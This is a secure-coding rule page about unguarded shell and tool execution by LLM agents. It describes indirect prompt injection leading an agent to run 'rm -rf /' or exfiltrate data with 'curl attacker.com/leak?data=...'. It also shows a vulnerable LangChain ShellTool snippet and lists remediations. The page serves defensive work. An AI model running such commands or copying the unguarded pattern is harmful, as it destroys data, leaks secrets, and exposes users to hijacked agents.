# CR-LLM-003: Insecure Autonomous Agent Tool Execution (OWASP LLM 2025)

| Metadata | Specification |
| :--- | :--- |
| **Rule ID** | `CR-LLM-003` |
| **Severity** | `CRITICAL` |
| **Category** | `SECURITY` |
| **CWE ID** | [CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component](https://cwe.mitre.org/data/definitions/74.html) |
| **OWASP Top 10 for LLM** | LLM07:2025 – Insecure Plugin & Tool Design |
| **Languages** | Python, TypeScript, JavaScript, Java |

---

## Vulnerability Overview

In Agentic AI architectures (LangChain, AutoGPT, CrewAI, LlamaIndex), models are granted access to external tools (bash interpreters, SQL executors, REST clients, filesystem access).

When an agent system passes model-generated tool arguments directly to powerful execution sinks without human verification or strict argument schema bounds, an attacker can leverage **Indirect Prompt Injection** (e.g. from malicious web pages, poisoned emails, or untrusted user input) to command the agent to run arbitrary destructive commands (`rm -rf /`, `curl attacker.com/leak?data=...`).

---

## Vulnerable Code Patterns

```python
# Vulnerable LangChain Agent setup:
from langchain_community.tools import ShellTool

# High Risk: Agent executes shell commands with host user privileges
tools = [ShellTool()]
agent = initialize_agent(tools, llm, agent=AgentType.CHAT_ZERO_SHOT_REACT_DESCRIPTION)
agent.run("Analyze the latest untrusted customer ticket")
```

---

## Secure Remediation

1. Implement **Human-in-the-Loop (HITL)** approval workflows for any tool that performs state mutation, network egress, or OS operations.
2. Run tool execution inside isolated, unprivileged, network-restricted sandboxes (e.g., Docker non-root or Firecracker microVMs).
3. Enforce deterministic argument schemas with strict type constraints.
